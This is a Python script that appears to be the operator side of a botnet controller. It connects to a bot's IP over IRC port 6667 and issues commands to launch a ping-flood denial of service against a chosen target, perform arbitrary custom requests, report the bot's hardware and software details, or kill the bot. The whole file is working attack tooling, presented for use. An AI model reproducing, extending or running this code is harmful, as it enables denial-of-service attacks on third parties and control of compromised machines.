import socket
import json
import pprint


def get_action(bot):
    action = input("[IRC] Perform Ping of Death by bot ('f'), send a custom http request ('c'), get hardware/software info of bot (i), kill the bot ('kill') or exit irc connection('exit'). . . ") 
    if action == 'f':
        target = input("[IRC] Type the target. . . ")
        return f"dos:ping -f {target}"
    elif action == 'c':
        return "dos:" + input(f"[IRC] Type the request that you want {bot} to perform. . . ")
    elif action == 'i':
        return "hwsw:"
    elif action == 'exit' or action == 'kill':
        return action
    return ''

def irc_client_program():
    # server info
    bot = input("[IRC] Type the ip of the bot you want to connect to. . . ")
    port = 6667

    # connect to server
    client_socket = socket.socket()
    try:
        client_socket.connect((bot, port))
    except socket.error as serr:
        if serr.errno == socket.errno.ECONNREFUSED:
            print(f"[IRC] Bot with ip {bot} not reachable, check bots reachable using command 'dump'")
            return f"down:{bot}"

    while True:
        msg = get_action(bot)
        print("sending ", msg)
        client_socket.send(msg.encode())

        # data = client_socket.recv(1024).decode()
        # print('Received from server: ' + data)
        if msg == 'exit':
            client_socket.close()
            return 1
        elif msg == "kill":
            client_socket.close()
            return f"down:{bot}"
        if msg.split(':')[0] == "hwsw":
            hw_sw_infos = client_socket.recv(4096).decode()
            hw_sw_infos = json.loads(hw_sw_infos)
            pprint.pprint(hw_sw_infos)
    
    return 0


if __name__ == '__main__':
    irc_client_program()